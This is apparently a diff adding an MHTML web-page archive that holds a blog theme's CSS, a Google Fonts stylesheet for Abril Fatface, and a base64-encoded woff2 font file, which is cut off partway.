+  #sidebar, .home #sidebar { width: 18rem; text-align: left; }
+  #sidebar > :last-child, .home #sidebar > :last-child { margin-bottom: 0px=
+; }
+  #sidebar .site-title { font-size: 3.25rem; }
+  #sidebar .site-title .back-arrow { display: none; }
+  #sidebar p.lead, #sidebar header ~ * { display: block; }
+  #sidebar header ~ nav { display: flex; }
+  .index #sidebar { margin-bottom: 0px; }
+  .container { background: rgb(255, 255, 255); color: rgb(81, 81, 81); padd=
+ing: 4rem 4rem 0px; height: 100vh; }
+  .container > header { color: rgb(49, 49, 49); margin: 0px; }
+  .container > header h1, .container > header h2 { color: inherit; }
+  .container > header h1:last-child, .container > header h2:last-child { ma=
+rgin-bottom: 0.5rem; }
+  .container > * { max-width: 38rem; padding: 0px; }
+}
+
+#sidebar a { color: rgb(255, 255, 255); }
+
+#sidebar a svg { fill: rgba(255, 255, 255, 0.85); }
+
+#sidebar a:hover svg, #sidebar a:focus svg, #sidebar a.active svg { fill: r=
+gba(255, 255, 255, 0.85); }
+
+#sidebar a:hover, #sidebar a:focus { text-decoration: underline; }
+
+#sidebar a:hover.icon, #sidebar a:focus.icon { text-decoration: none; }
+
+#sidebar a.active { font-weight: bold; }
+
+#sidebar .site-title { color: rgb(255, 255, 255); }
+
+#sidebar .site-title a { color: inherit; }
+
+#sidebar nav { display: flex; }
+
+#sidebar-nav-links { flex-flow: column nowrap; }
+
+#sidebar-icon-links { max-width: 100%; flex-flow: row wrap; justify-content=
+: center; margin-top: 1rem; }
+
+@media (min-width: 49rem) {
+  #sidebar-icon-links { margin-left: -0.25em; justify-content: flex-start; =
+}
+}
+
+#sidebar nav > * { display: block; line-height: 1.75; }
+
+#sidebar nav > .icon { font-size: 1.5rem; display: inline-block; margin: 0p=
+x 0.25em; }
+
+@media (min-width: 49rem) {
+  body { align-items: flex-end; }
+}
+
+.masthead { padding-top: 1rem; padding-bottom: 1rem; margin-bottom: 3rem; }
+
+.masthead-title { margin-top: 0px; margin-bottom: 0px; color: rgb(81, 81, 8=
+1); }
+
+.masthead-title a { color: inherit; }
+
+.masthead-title small { font-size: 75%; font-weight: 400; opacity: 0.5; }
+
+article + *, .post-body ~ section { padding-top: 2rem; border-top: 1px soli=
+d rgb(229, 229, 229); margin-top: 2rem; }
+
+article + * > h2:first-child, article + * > h3:first-child, .post-body ~ se=
+ction > h2:first-child, .post-body ~ section > h3:first-child { margin-top:=
+ 0px; }
+
+.post .content li + li, .page .content li + li { margin-top: 0.25rem; }
+
+.page-title, .post-title, .post-title a { color: rgb(49, 49, 49); }
+
+.page-title, .post-title { margin-top: 0px; }
+
+h2.post-title, h2.page-title { font-size: 2rem; }
+
+.post-meta { margin-top: -0.5rem; margin-bottom: 1rem; color: rgb(118, 118,=
+ 118); }
+
+.post-tags a { font-size: 0.8em; margin-right: 0.5rem; white-space: nowrap;=
+ opacity: 0.75; }
+
+.post-tags a .tag-name { text-transform: capitalize; }
+
+.post-tags a:hover { text-decoration: none; opacity: 1; }
+
+.posts-by-tag h2 { text-transform: capitalize; }
+
+.posts-list { padding-left: 0px; list-style: none; }
+
+.posts-list h3 { margin-top: 0px; }
+
+.posts-list li small { font-size: 75%; color: rgb(153, 153, 153); white-spa=
+ce: nowrap; }
+
+.posts-list li a:hover { color: rgb(38, 139, 210); text-decoration: none; }
+
+.posts-list li a:hover small { color: inherit; }
+
+button.disqus-load { margin-top: 1em; }
+
+.pagination { margin-bottom: 2rem; color: rgb(204, 204, 204); text-align: c=
+enter; }
+
+.pagination > a { display: inline-block; padding: 1em 1.5em; border: 1px so=
+lid rgb(229, 229, 229); border-radius: 300px; width: 60%; max-width: 18rem;=
+ background: rgb(255, 255, 255); box-shadow: rgba(0, 0, 0, 0.16) 1px 1px 1p=
+x; }
+
+.pagination > a:hover { background-color: rgb(229, 229, 229); }
+
+* + .pagination { margin-top: 2rem; }
+
+.content .pagination:first-child { margin-top: -4rem; }
+
+.index #sidebar { padding-bottom: calc(2rem + 1em); }
+
+.home.index #sidebar { padding-bottom: 2rem; }
+
+@media (min-width: 49rem) {
+  .pagination > a { box-shadow: none; }
+  .pagination > a:hover { box-shadow: rgba(0, 0, 0, 0.16) 1px 1px 1px; }
+  .content .pagination:first-child { margin-top: 0px; }
+  .content .pagination:first-child + * { padding-top: 2rem; border-top: 1px=
+ solid rgb(229, 229, 229); margin-top: 2rem; }
+  .index #sidebar { padding-bottom: 2rem; }
+}
+
+.message { margin-bottom: 1rem; padding: 1rem; color: rgb(113, 113, 113); b=
+ackground-color: rgb(249, 249, 249); }
+
+.search-row { display: flex; border: 1px solid rgb(229, 229, 229); border-r=
+adius: 300px; padding: 2px; }
+
+.search-row input { border: 0px; }
+
+.search-row input + input { margin-left: 2px; }
+
+.search-row input[type=3D"text"], .search-row input[type=3D"search"] { flex=
+-grow: 1; }
+
+.tags-list a { margin-right: 0.5em; white-space: nowrap; opacity: 0.75; }
+
+.tags-list a .tag-count { background: rgb(38, 139, 210); color: rgba(255, 2=
+55, 255, 0.8); margin-left: 0.25em; border-radius: 1000px; font-size: 0.75e=
+m; padding-left: 0.6em; padding-right: 0.6em; }
+
+.tags-list a:hover { text-decoration: none; opacity: 1; }
+
+@keyframes posts-for-tag-fade-in {=20
+  0% { opacity: 0; }
+  100% { opacity: 1; }
+}
+
+.posts-for-tag { display: none; }
+
+.posts-for-tag:target { display: block; animation: posts-for-tag-fade-in 0.=
+6s ease-in-out 0s 1 normal none running; }
+------MultipartBoundary--ILjgn3GondzfuDIOjQfrYqLpj4vcJIA0jfHucfqfRu----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://fonts.googleapis.com/css?family=Abril+Fatface
+
+@charset "utf-8";
+
+@font-face { font-family: "Abril Fatface"; font-style: normal; font-weight:=
+ 400; src: url("https://fonts.gstatic.com/s/abrilfatface/v12/zOL64pLDlL1D99=
+S8g8PtiKchq-lmjdLh.woff2") format("woff2"); unicode-range: U+100-24F, U+259=
+, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A72=
+0-A7FF; }
+
+@font-face { font-family: "Abril Fatface"; font-style: normal; font-weight:=
+ 400; src: url("https://fonts.gstatic.com/s/abrilfatface/v12/zOL64pLDlL1D99=
+S8g8PtiKchq-dmjQ.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+1=
+52-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122=
+, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+------MultipartBoundary--ILjgn3GondzfuDIOjQfrYqLpj4vcJIA0jfHucfqfRu----
+Content-Type: font/woff2
+Content-Transfer-Encoding: base64
+Content-Location: https://fonts.gstatic.com/s/abrilfatface/v12/zOL64pLDlL1D99S8g8PtiKchq-dmjQ.woff2
+
+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
